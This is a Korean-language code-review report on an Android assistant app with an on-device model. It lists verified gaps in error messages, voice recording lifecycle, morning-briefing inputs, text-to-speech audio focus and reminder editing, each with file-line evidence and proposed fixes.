  - domain/src/main/java/com/kosmos/app/domain/usecase/AddReminderUseCase.kt:34-36 — 사유 문장이 한국어 고정
  - core/src/main/java/com/kosmos/app/core/mapper/ErrorMessages.kt:257, 294 — "50MB" 숫자를 문구에 베껴 씀(기준은 Constants.kt:214), 문구 전체가 strings.xml 밖 코틀린 하드코딩이라 번역 누락 검사(lint MissingTranslation) 대상이 아님
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:576-580 — 엔진 초기화 실패는 원인(메모리 부족·캐시 쓰기 실패 등)과 무관하게 ModelLoadFailed → "파일이 손상됐을 수 있으니 다시 내려받아 주세요"(3.6GB 재다운로드 유도)
- 검증: 사실 확인은 대부분 맞다: SearchError 생성처 0곳(테스트만), PermissionDenied 생성처는 ChatScreen.kt:274 와 AndroidCalendarTool.kt:35·100·108·159 뿐이라 ErrorCodeMapper.kt:37 의 else(PERMISSION_DENIED_STORAGE)는 도달 불가. BaseAgent.kt:177-185 의 한·영 사유 문장은 ErrorMessages.kt:44 가 코드만 보고 문구를 골라 버려진다. GemmaModelRunner.kt:394·404 도 같은 문구로 합쳐진다. ValidationError.reason 을 화면에 그대로 쓰는 곳은 ChatViewModel.kt:266, CalendarViewModel.kt:152-153, ChatExtrasViewModel.kt:221-223. AddReminderUseCase.kt:34·36 사유 문장은 한국어 고정 — 영어 모드에서 그대로 보일 수 있다. '50MB' 는 ErrorMessages.kt:33·70 에 베껴 씀(기준 Constants.kt:214). 엔진 초기화 실패는 GemmaModelRunner.kt:576-580 에서 원인 구분 없이 ModelLoadFailed. 틀리거나 약한 부분: (1) 기계용 토큰(blank·too_long)이 실제로 화면에 나오는 경로는 확인되지 않았다 — 세 화면이 받는 실패가 토큰을 싣는지 추적하지 못한 가정이다. (2) 문구가 strings.xml 밖에 있는 것은 설계 문서에 적힌 의도된 구조이고 한·영 둘 다 한 파일에 있어 번역 누락은 when 전수 분기가 잡는다 — 약점으로 보기 어렵다. (3) 메모리 부족일 때 불필요한 재다운로드를 부른다는 것은 재현 근거가 없는 추정이고, 시작 화면에 '다시 시도' 버튼도 함께 있다(SplashScreen.kt:116). 증거의 ErrorCodeMapper.kt:196, ErrorMessages.kt:257·294 줄 번호는 틀렸다(각각 37줄, 33·70줄). 정리 가치는 있으나 낮은 우선순위.
- 앞선 기록: architecture.md 1298줄(사용자 문구의 단일 출처는 ErrorMessages — 리소스 밖에 두는 것은 의도된 구조), CHANGELOG 0.40.2 564줄(ErrorMessages 에 언어 인자), CHANGELOG 964줄 부근(SearchError 오분류 교정), SplashScreen.kt:109 주석(로드 실패도 해법이 다시 내려받기라 같은 버튼)

<details><summary>읽은 범위</summary>

직접 읽은 것: core 의 AppError·AppResult·ValidationReason·ErrorCode·ErrorCodeMapper·ErrorMessages·RunCatchingCancellable 전문, data 의 DbCall 전문, ExportImportManager(내보내기·복원·교체 전부), ModelDownloadService(내려받기 본문·예외 변환), WikipediaSearchToolImpl 실패 분기, domain 의 SendChatMessageUseCase·AddScheduleUseCase·TranscribeAudioUseCase·ModelDownloadException, app 의 AssistantMessageWriter 전문, AssistantOrchestrator·BaseAgent 의 오류 분기, GemmaModelRunner 의 runTurn·warmUp·엔진 초기화, GemmaRuntimeManager, RuntimeMetricsCollector 의 발열 판정, ChatViewModel(오류·보내기·녹음·공유 입력 구독), ChatScreen 의 스낵바·권한 부분, ChatInputBar 보내기 부분, ChatHeader 상태 시트, SplashScreen 오류 부분, ShareIntentHandler, BackupFileWriter, MemoryViewModel 백업 부분, DataResetViewModel, ModelDownloadWorker·WorkManagerModelDownloadScheduler 실패 변환, ModelManagementScreen 실패 대화상자, DocumentOpener 캐시 복사·예외 변환, LibraryIndexer 저장 분기, DefaultPagingSource, 툴 실행기들의 실패 문구. AppError 23종 각각의 생성처·표시처는 grep 으로 짝지었다. app/.../core/mapper/ 폴더는 존재하지 않았다(매퍼는 core 모듈에만 있음).\n\n읽지 못했거나 부분만 본 것: ContextBuilder 는 grep 만 했다(오류 말풍선을 대화 기록에서 걸러내는지 — 걸러내는 코드를 못 찾았을 뿐 전 경로 확인은 아님, gap-errors-3 을 medium 으로 둔 이유). values-en/strings.xml 은 발열 문구만 대조했고 error 계열 한·영 전수 대조는 하지 않았다(ErrorMessages 의 한·영 26쌍은 전수로 읽었고 누락 없음). 설정 음성·임베딩 모델 구역, 일정 화면의 편집 오류 표시부, 활동 기록 화면 본문, 프로필 시트는 ViewModel 의 문구 선택부만 확인했다. 엔진 초기화 실패의 원인별(메모리 부족·캐시 쓰기 실패) 동작은 코드 추정이며 실행·재현하지 않았다(규칙상 실행 금지). 그래프 도구는 쓰지 않고 grep·파일 읽기만 썼다.\n\n10건 밖으로 뺀 것(4건): (a) 데이터 초기화 때 알림 목록 읽기가 실패하면 예약된 알람 취소를 건너뛰고 그대로 초기화하는 것(DataResetViewModel.kt:71-74) — DB 읽기 실패와 초기화 성공이 동시에 나야 해서 가능성이 낮음. (b) 공유 메뉴로 PDF 등 문서를 보내면 '지원하지 않는 파일 형식'(ShareIntentHandler.kt:120-123) — 오류 문구가 아니라 기능 범위 문제. (c) 발열 차단이 툴 실행 뒤 두 번째 생성에서 걸리면 일정은 추가됐는데 '중단' 말풍선이 뜨는 조합 — 드문 경계 조건. (d) 백업 크기 상한 512MB 를 넘는 DB 는 내보내기는 되고 복원만 거부되는 비대칭(ExportImportManager.kt:229-231, 254-256) — 현재 데이터 규모에서 도달 가능성이 낮음. 실사용은 디버그 빌드 유지, 화면 민감 값 가리기 금지 등 이미 내려진 결정과 충돌하는 제안은 넣지 않았다.

</details>

## 아침 브리핑·주간 돌아보기·프로필 제안·음성(녹음·낭독)·결과 카드 편집 — 부분만 읽힌 부가 기능 묶음 (gap-briefingvoice)

### gap-briefingvoice-1 · 녹음 중에 앱을 내리거나 화면을 떠나도 녹음이 멈추지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 실사용에서 흔한 경로다: 마이크를 누르고 말하다가 전화가 오거나 홈으로 나가면 ① 마이크가 최대 30초 동안 백그라운드에서 켜진 채(상태바 마이크 표시) 남고 ② 30초 뒤 타이머가 녹음을 보내지만 그때는 백그라운드 전환으로 모델이 이미 해제돼 있어 '모델 준비 안 됨' 오류로 끝나고 녹음 파일은 지워진다. 돌아온 사용자는 말한 내용이 사라지고 뜻 모를 오류 안내만 본다. 화면(ViewModel)이 없어지는 경우에는 타이머까지 취소돼 마이크를 닫을 주체가 아예 없다. 포트폴리오에서는 '마이크 자원을 수명주기에 묶었는가'라는 질문에 약점이 된다.
- 제안: AudioRecorder 에 결과를 보내지 않고 닫는 cancelRecording()(플래그 내림 → 쓰기 코루틴 종료 대기 → stop/release → 파일 삭제)을 추가한다. ChatViewModel 에 cancelRecording() 을 두어 타이머 취소 + isRecording=false + 녹음기 취소를 하고, ChatScreen 의 LifecycleStartEffect onStopOrDispose(이미 onScreenVisible(false) 를 부르는 자리)와 onCleared 에서 부른다. 백그라운드로 나간 녹음은 버리고 돌아왔을 때 '녹음이 취소됐어요' 한 줄 안내(문자열 한/영 추가). Robolectric 테스트: 녹음 중 onStop → isRecording false, 녹음기 cancel 호출, sendMessage 미호출.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:726-729 — onCleared 가 낭독만 멈추고 녹음기는 건드리지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:654-690 — 30초 타이머가 viewModelScope 에서 돌아 앱이 백그라운드여도 깨어나 stopRecordingAndSend → sendMessage 를 부른다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/KosmosApp.kt:102-113 — 앱이 백그라운드로 갈 때 모델·낭독·임베딩은 해제하지만 녹음기 정지는 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:233-270 — 엔진이 Ready 가 아니면 음성 추론이 바로 실패(ModelNotReady)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/AudioRecorder.kt:108-138 — 정지·해제는 stopRecording 뿐이고, 버리는(취소) 진입점이 없다. 30초 상한에 닿아도 쓰기만 멈추고 마이크(AudioRecord)는 stopRecording 이 불릴 때까지 열려 있다(184-198)
- 검증: 직접 확인: ChatViewModel.kt:726-729 onCleared 는 speechOutput.stop() 뿐. 654-693 에서 30초 타이머가 viewModelScope 로 돌고 stopRecordingAndSend → sendMessage("", path). KosmosApp.kt:103-117 의 프로세스 onStop 은 modelRunner.close()·speechOutput.release() 등만 부르고 녹음기는 없다. ChatScreen.kt:133-136 의 onStopOrDispose 는 onScreenVisible(false) 만. AudioRecorder.kt 에는 stopRecording(108-138) 외 취소 진입점이 없고, 상한 도달 시 184-196 루프만 끝나며 AudioRecord 는 stop/release 전까지 열려 있다. 백그라운드에서 타이머가 깨면 GemmaModelRunner.kt:257-259 가 ModelNotReady 로 실패하고 AssistantOrchestrator.kt:92-96 finally 가 녹음 파일을 지운다 — 주장한 경로가 성립. 보정 2가지: (1) 채팅 ViewModel 은 시작 화면의 내비게이션 항목에 묶여 있어(AppNavHost.kt:110) onCleared 는 사실상 액티비티 종료 때만 온다 — '닫을 주체가 아예 없다'는 드문 경우. (2) 안드로이드는 백그라운드로 간 앱의 마이크 입력을 무음으로 만들 수 있어 실제로 소리가 계속 녹음된다고 단정할 수는 없다(기기 미확인). 그래도 마이크 자원이 최대 30초 열린 채 남고 돌아오면 뜻 모를 오류가 뜨는 것은 코드로 확인됨.
- 앞선 기록: CHANGELOG 0.29.0 M4(낭독만 화면 종료·앱 내림 때 정지), CHANGELOG 0.40.2 M3-9(녹음 중 입력 잠금만). 녹음의 수명주기 처리 기록은 없음

### gap-briefingvoice-2 · 아침 브리핑의 '미완료 할 일' 재료에 일정·알림 행이 섞여 들어간다
- 판정 이미 결정·기록됨 · 중요도 낮음 · 크기 S · 모델 입력
- 왜: 매일 실사용하면 바로 드러난다. 다음 달 일정이나 이미 울린 알림이 날짜 없이 '아직 안 한 할 일'로 브리핑에 읽히고, 오늘 일정은 두 번 언급될 수 있다. 최신 20행 상한을 일정·알림이 먼저 채우면 정작 할 일 탭에 적은 할 일(채팅에서는 브리핑만 볼 수 있는 항목)이 밀려난다. 알림의 '할 일 N건'과 카드 본문의 할 일 수도 어긋난다.
- 제안: MorningBriefingGenerator.collectMaterials 의 할 일 조회를 getPendingTodosData(일정 제외)로 바꾸고, 알림 행(remindAtIso 있는 것)은 빼거나 아직 안 울린 오늘 알림만 시각을 붙여 일정 블록 쪽에 넣는다. 브리핑은 채팅과 별개의 한 번짜리 추론이라 채팅 토큰 여유(약 20)에는 영향이 없지만 브리핑 모델 입력이 바뀌므로, 전에 쓴 브리핑 측정(인사·해요체·질문 1개·시각 보존)과 같은 방식으로 실험실에서 먼저 확인하고 CHANGELOG 에 남긴다. MorningBriefingGeneratorTest 에 '일정 행은 할 일 재료에 없다' 추가.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/briefing/MorningBriefingGenerator.kt:188-193, 217 — 할 일 재료를 getPendingTasksData(0, 20) 로 읽는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/local/db/dao/TaskDao.kt:17-18 — 그 조회는 완료·취소만 빼고 일정(dueDateIso 있는 행)·알림(remindAtIso 있는 행, 이미 울린 것 포함)을 전부 최신순 20개로 돌려준다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:97-117 — 오늘 일정도 같은 표에서 뽑으므로 오늘 일정은 [오늘 일정]과 [미완료 할 일] 양쪽에 들어간다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:117 — 할 일 줄은 제목만("- 제목") 써서 날짜가 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/work/BriefingNotificationWorker.kt:47-49 — 알림 미리보기 개수는 일정을 뺀 getPendingTodosData 로 센다(본문과 기준이 다름)
- 검증: 사실관계는 맞다: MorningBriefingGenerator.kt:190 이 getPendingTasksData(0, 20) 을 쓰고, TaskDao.kt:17-18 은 완료·취소만 뺀 최신순 전체(일정·알림 행 포함). GetTodayScheduleUseCase.kt:97-117 도 같은 표에서 오늘 일정을 뽑아 오늘 일정이 두 블록에 들어갈 수 있고, GenerateBriefingUseCase.kt:117 은 제목만 쓴다. BriefingNotificationWorker.kt:48 은 getPendingTodosData 로 세어 기준이 다르다. 다만 이것은 모르고 남은 결함이 아니라 0.38.3 에서 '브리핑 모델 입력은 건드리지 않는다'고 범위를 정해 일부러 둔 것이다(코드 주석 두 곳에도 적혀 있음). 다시 열려면 브리핑 입력이 바뀌므로 실측이 먼저여야 하고 사용자 결정 사항이다. 일정 20행이 할 일을 밀어낸다는 부분은 코드상 가능하나 실제 데이터로 본 것은 아님.
- 앞선 기록: CHANGELOG 0.38.3 M2b(docs/CHANGELOG.md:733, 사용자 결정) — '아침 브리핑 모델 입력·오늘 일정 조회는 그대로(프롬프트 표면 무변경)'. TaskDao.kt:23-24 주석과 TaskRepository.kt:26 KDoc 도 '모델 입력(아침 브리핑)은 전체 조회를 쓴다'고 명시

### gap-briefingvoice-3 · 깨진 글자 브리핑이 걸러지지 않고 대화 기록에 저장된다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 0.42.4 에서 휴대폰이 깨진 글자를 수천 토큰 낸 일이 실제로 있었고, 그때 돌아보기·요약·추출에는 거르는 장치를 넣었지만 브리핑은 빠졌다. 브리핑은 다른 부수 추론과 달리 채팅 세션에 메시지로 저장되므로, 깨진 브리핑은 화면 카드로 보일 뿐 아니라 그날 '오늘 브리핑 있음'으로 판정돼 다시 만들지도 않고, 이후 채팅 턴의 대화 기록(모델 입력)과 그 구간 요약의 재료까지 오염시킨다. (출력 길이 상한이 없는 문제는 이미 보고됐고, 이것은 그와 짝이 되는 '내용 검사' 빈틈이다.)
- 제안: GenerateBriefingUseCase.invoke 에서 trim 뒤 BrokenOutput.looksBroken(text, materials.lang) 이면 AppResult.Failure(ModelInferenceError) 로 돌린다 — 생성기는 이미 실패 시 저장하지 않고 다음 준비 완료 때 다시 시도한다(150-153줄). 같은 날 무한 재시도를 막으려면 생성기에 '오늘 실패 횟수' 메모리 카운터(2회까지)를 둔다. 단위 테스트 1건(깨진 출력 → Failure, 저장 0건). 영어 결과는 이 규칙으로 못 가리므로 이미 보고된 출력 상한과 함께 넣는 것이 맞다. 모델에 들어가는 글은 바뀌지 않는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:61-71 — 빈 문자열만 실패로 보고 그대로 Success
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/briefing/MorningBriefingGenerator.kt:148-167 — 결과를 그대로 활성 세션의 비서 메시지(BRIEFING)로 저장
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/cleanup/GenerateWeeklyReviewUseCase.kt:97 — 주간 돌아보기는 BrokenOutput.looksBroken 으로 걸러 저장하지 않는다(브리핑에는 같은 검사가 없다)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/modelrunner/OneShotLimits.kt:23-40 — 판정 함수는 이미 있다
- 검증: 직접 확인: GenerateBriefingUseCase.kt:52-71 은 ChatPrompt 에 maxOutputTokens 도 없고 결과는 trim 뒤 빈 문자열만 실패로 본다. BrokenOutput.looksBroken 사용처는 GenerateWeeklyReviewUseCase.kt:97, ExtractFactsUseCase.kt:71, SummarizeEpisodeUseCase.kt:67 세 곳뿐(grep) — 브리핑에는 없다. MorningBriefingGenerator.kt:148-171 은 성공 결과를 그대로 활성 세션의 BRIEFING 메시지로 저장하고, 128-132 의 '오늘 브리핑 개수 > 0' 판정 때문에 깨진 브리핑이 저장되면 그날은 다시 만들지 않는다. 실패 시 저장하지 않고 다음 준비 완료 때 재시도하는 구조(150-153)도 제안대로 맞다. 0.42.8 D3 의 '넣지 않음'은 채팅 답 스트림에 대한 것이라 한 번짜리 브리핑에는 해당하지 않는다. 제안은 모델 입력을 바꾸지 않는다. 세부: 브리핑은 한국어 문장이라 오탐 위험은 낮지만 일정 제목이 영어뿐인 날은 시험해 볼 것. 출력 상한(maxOutputTokens)도 같이 넣어야 영어 모드까지 막힌다.
- 앞선 기록: CHANGELOG 0.42.4 M2(docs/CHANGELOG.md:139-140) — 출력 상한·깨진 출력 거르기를 요약·추출·회고·판정에만 적용. CHANGELOG 0.42.8 D3(:51) — 채팅 답 스트림에는 일부러 넣지 않음. 브리핑을 빼기로 한 기록은 없음

### gap-briefingvoice-4 · 아침 브리핑에 '몇 시까지'가 없어 밤에 앱을 열어도 아침 인사가 만들어지고, 앱을 쓰는 중에 시각이 되면 알림만 오고 본문은 없다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 실사용 첫 주에 바로 만날 장면이다. 낮 동안 앱을 안 열고 밤 11시에 처음 열면 시작 화면에서 십여 초를 기다린 뒤 '좋은 아침이에요'와 이미 지나간 일정 정리가 대화에 저장된다(그 뒤 채팅의 대화 기록에도 남는다). 반대로 설정 시각에 앱을 이미 쓰고 있으면 알림은 오는데 눌러도 브리핑 카드가 없다 — 앱을 한 번 내렸다 올려야 생긴다.
- 제안: ① shouldGenerateBriefing 에 마감(예: 설정 시각 + N시간, 또는 그날 오후 고정 시각 — 값은 사용자에게 물어 정한다)을 넣어 넘으면 그날은 건너뛴다. 순수 함수라 테스트로 경계를 고정할 수 있다. 단 기존 테스트 '자정 설정(0분)은 하루 내내 참이다'(BriefingConditionTest)와 맞부딪히므로 단언 변경은 대상을 보여 주고 사용자 확인을 받는다(AGENTS §2-②). ② 앱 사용 중 시각이 되는 경우: 알림 워커가 끝날 때 신호를 내거나 StartupCoordinator 가 '입력이 멎은 조용한 창'에서 maybeGenerate 를 한 번 더 부르게 한다(백그라운드 로드 금지 원칙 안 — 엔진이 이미 준비된 때만). 지시문 자체는 바꾸지 않으므로 모델 입력은 그대로다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/briefing/MorningBriefingGenerator.kt:226-237 — 판정은 '오늘 브리핑이 없고 지금 ≥ 설정 시각'뿐, 위쪽 한계가 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:168-178 — 지시가 "좋은 아침이에요."로 시작하고 '오늘 일정'을 정리하라고 고정
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/startup/StartupCoordinator.kt:123-150 — maybeGenerate 는 엔진이 준비 상태로 바뀌는 순간(시작 단계)에만 불린다. 다른 호출처 없음(grep 확인)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/work/BriefingNotificationWorker.kt:42-59 — 정시 알림은 앱이 전경이어도 나가고 '열면 브리핑' 안내를 단다
- 검증: 코드 사실은 맞다: MorningBriefingGenerator.kt:226-237 의 판정에 위쪽 한계가 없고, maybeGenerate 호출처는 StartupCoordinator.kt:136 한 곳뿐(grep), 그것도 엔진이 준비 상태로 바뀔 때 도는 runStages 안이다. BriefingNotificationWorker.kt:42-59 는 전경 여부와 무관하게 알림을 낸다. 다만 앞 절반(밤에 열어도 아침 브리핑)은 결함이 아니라 '놓친 아침은 다음 준비 완료 때 복원'이라는 기록된 설계이고 '앱을 열면 도착'이라는 알림·설정 문구와도 맞는다 — 마감을 둘지는 취향·사용자 결정이며, 기존 단언(BriefingConditionTest:42-45)을 바꿔야 한다. 뒤 절반(앱을 쓰는 중에 시각이 되면 알림만 오고 본문은 앱을 내렸다 올려야 생김)은 실제 빈틈으로 확인됨 — 알림 문구와 어긋나는 쪽은 이쪽이다. 고친다면 뒤 절반만 떼어, 엔진이 이미 준비된 조용한 창에서 한 번 더 부르는 방식이 원칙(백그라운드 로드 금지)에 맞다.
- 앞선 기록: MorningBriefingGenerator.kt:52-56 KDoc '놓친 아침은 다음 Ready 가 복원한다'(의도된 설계), BriefingConditionTest.kt:42-45 '자정 설정(0분)은 하루 내내 참이다'. 알림 문구 strings.xml:405 '앱을 열면 브리핑이 도착해요', :446 설정 각주. 마감 시각을 논의한 기록은 CHANGELOG·ADR·계획서에 없음

### gap-briefingvoice-5 · 낭독이 전화·다른 앱에 소리 우선권을 빼앗겨도 계속 읽는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 자동 낭독을 켜고 쓰면 긴 답을 읽는 중에 전화가 오거나 다른 앱(내비·음악·영상)이 소리를 가져가도 낭독이 겹쳐서 계속 나온다. 통화 중에 답이 완성되면 통화 위에 낭독이 시작될 수도 있다. 안드로이드의 기본 예절(우선권을 잃으면 멈춘다)을 지키지 않는 것이라 포트폴리오 설명에서도 약점이다. 실기기 확인 목록에는 '음악 줄였다 복귀'만 있고 빼앗기는 경우는 없다.
- 제안: requestFocus 에서 setOnAudioFocusChangeListener 를 달아 AUDIOFOCUS_LOSS·LOSS_TRANSIENT 면 stop() 을 부른다(잠깐 줄이기 CAN_DUCK 은 무시). requestAudioFocus 결과가 AUDIOFOCUS_REQUEST_GRANTED 가 아니면 낭독을 시작하지 않고 false 를 돌린다(자동 낭독은 조용히 건너뛰고, 직접 누른 경우는 기존 안내 채널로 한 줄). Robolectric ShadowAudioManager 로 '우선권 상실 → speakingMessageId null' 테스트 1건. 휴대폰 확인(전화 수신 중 낭독)은 실기기 목록에 한 줄 추가.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:206-218 — AudioFocusRequest 에 변화 수신기(setOnAudioFocusChangeListener)가 없고 requestAudioFocus 의 결과값도 버린다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:74-93 — 우선권을 못 얻어도(통화 중 등) 그대로 engine.speak 를 넣는다
- 검증: 직접 확인: SpeechOutput.kt:206-218 requestFocus 는 AudioFocusRequest 에 변화 수신기를 달지 않고 requestAudioFocus 반환값도 쓰지 않는다. 84-92 에서 우선권 결과와 무관하게 engine.speak 를 넣는다. AudioFocus 관련 코드는 저장소에서 이 파일뿐이고 테스트에도 없다(grep). 따라서 전화·다른 앱이 소리를 가져가도 낭독이 멈추지 않는다는 주장은 코드상 맞다(실기기에서 엔진이 스스로 멈추는지는 미확인 — 삼성·구글 엔진에 따라 다를 수 있음). 심각도는 낮춤: 자동 낭독은 기본 꺼짐(SpeechOutput.kt:95 주석)이고 앱이 백그라운드로 가면 KosmosApp 이 release 로 멈추므로, 남는 경우는 앱을 보고 있는 중 전화 수신·다른 앱 소리 정도다. 수정 폭은 작고 모델 입력과 무관.
- 앞선 기록: CHANGELOG 0.29.0 M1(docs/CHANGELOG.md:916), docs/plans/0.29.0-tts.md:38·63, docs/checklists/device_gate.md:46 — 모두 '음악을 줄였다 복귀'만 다룸. 우선권을 빼앗기는 경우의 결정 기록 없음

### gap-briefingvoice-6 · 알림 수정 시트의 버튼을 빠르게 두 번 누르면 두 번 실행되고, 중간 실패 시 저장과 안내가 어긋난다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 미루기 버튼은 시트가 닫히기 전(DB 저장·위젯 갱신·기록 저장 동안) 다시 눌릴 수 있어, 10분 미루려다 20분이 되거나 '미뤘어요' 줄이 대화에 두 번 남는다. 대화 저장만 실패한 경우에는 사용자가 실패 안내를 보고 다시 누르면 또 10분이 더해진다. 알림은 시각이 생명이라 조용히 틀어지면 신뢰를 잃는다.
- 제안: ① ChatExtrasViewModel·CalendarViewModel 의 편집 진입에 진행 중 플래그(또는 Job 이 살아 있으면 무시)를 두고 시트 버튼을 그동안 비활성화한다. ② ReminderEditor.finish 에서 대화 한 줄 저장 실패는 본 작업 실패로 올리지 않는다 — 로그만 남기고 Success 로 돌려 화면이 실제 상태(이미 바뀜)와 맞게 한다. ③ moveTo·cancel 첫머리에서 cancelledAt·isCompleted 를 확인해 이미 끝난 알림이면 ValidationError('이미 끝난 알림이에요')로 막는다. 테스트: 같은 미루기 두 번 동시 호출 → 저장 1회.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ChatExtrasViewModel.kt:208-226 — edit 가 진행 중 여부를 보지 않고 매번 새 코루틴을 띄운다. 시트는 성공 뒤에야 닫힌다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/CalendarViewModel.kt:147-157 — 일정 화면 쪽도 같은 구조
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:58-63 — 미루기는 '원래 시각과 지금 중 늦은 쪽 + 10분'이라 연달아 두 번이면 20분
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:97-123 — 할 일 저장 → 알람 예약 → 위젯 → 활동 기록 → 대화 한 줄 저장 순서인데, 마지막 대화 저장이 실패하면 Failure 를 돌려 화면에는 '바꾸지 못했어요'가 뜨지만 할 일과 알람은 이미 바뀌어 있다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/chat/result/ReminderEditor.kt:79-99 — 취소·완료된 할 일인지 편집기 자체는 확인하지 않는다(시트 화면만 버튼을 숨김)
- 검증: 직접 확인: ChatExtrasViewModel.kt:208-226 의 edit 와 CalendarViewModel.kt:147-157 의 editReminder 는 진행 중 여부를 보지 않고 매번 새 코루틴을 띄우며, 시트는 성공 뒤 closeReminder 로 닫힌다. ReminderEditSheet.kt:102-105 의 미루기 버튼에는 비활성 조건이 없다. ReminderEditor.kt:58-63 은 '원래 시각과 지금 중 늦은 쪽 + 10분'이라 두 번째 호출이 첫 저장 뒤에 읽으면 20분, 앞에 읽으면 같은 시각으로 대화 줄만 두 번 남는다. 111-123 finish 는 할 일 저장·알람 예약(98-100) 뒤 대화 저장이 실패하면 Failure 를 돌려 화면은 실패 안내, 실제는 변경됨 — 확인. 79-99 는 취소·완료 여부를 보지 않지만 시트가 그 상태에서는 버튼을 숨기므로(ReminderEditSheet.kt:108-118) 실제 도달은 시트가 열린 사이 알림이 울리거나 취소된 경우뿐이다. 두 번 누를 수 있는 창은 DB 저장·위젯 갱신 시간(짧음)이라 드물다 — 낮음 유지. 제안 ①(진행 중 잠금)과 ②(대화 저장 실패를 본 작업 실패로 올리지 않음)가 값어치 있고 ③은 덤.
- 앞선 기록: CHANGELOG 0.41.9 M3(화면 이동 연타만). docs/plans/0.38.2-chat-redesign.md:48-51(수정 시트·대화 한 줄 설계). 시트 연타·부분 실패 기록은 없음

### gap-briefingvoice-7 · 낭독 상태가 실제 소리와 어긋날 수 있다 — 오류 한 번이면 '멈춤' 버튼이 듣지 않는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 긴 답을 여러 조각으로 읽는 중 한 조각에서 엔진 오류가 나면 화면은 '읽지 않음'으로 바뀌고 소리 우선권도 내려놓지만 남은 조각은 계속 읽힌다. 이때 말풍선의 멈춤, 새 메시지 전송, 녹음 시작이 모두 stop() 을 거치는데 상태가 null 이라 아무 일도 하지 않아 — 녹음에 낭독 소리가 섞여 받아써진다(0.29.0 이 막으려던 바로 그 경우). 반대로 speak 가 즉시 실패하면 '읽는 중' 표시가 사용자가 누를 때까지 남는다. 드문 경로지만 삼성·구글 엔진 차이에 따라 실기기에서만 보일 종류다.
- 제안: ① onError 에서 tts?.stop() 을 먼저 부르고 finish() 한다(또는 utteranceId 가 지금 메시지 것일 때만). ② stop() 은 상태와 무관하게 tts?.stop() 을 부르고 상태만 조건부로 정리한다. ③ engine.speak 가 ERROR 를 돌리면 finish() 하고 false 를 돌린다. ④ 콜백에서 오는 정리는 메인 스레드로 넘기거나(Handler/Main 디스패처) 관련 필드를 한 잠금으로 묶는다. ⑤ create 에서 만든 엔진을 지역 변수로 잡아 onInit 에 넘긴다. 기존 SpeechOutputTest 에 '오류 뒤 stop 이 엔진을 멈춘다' 1건 추가.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:154-162 — onError 는 어느 조각·어느 메시지의 오류든 finish() 만 부르고 엔진 큐는 멈추지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:109-113 — stop() 은 speakingMessageId 가 null 이면 아무것도 하지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/speech/SpeechOutput.kt:87-92 — engine.speak 의 반환값(ERROR)을 보지 않고 '읽는 중'으로 표시한다
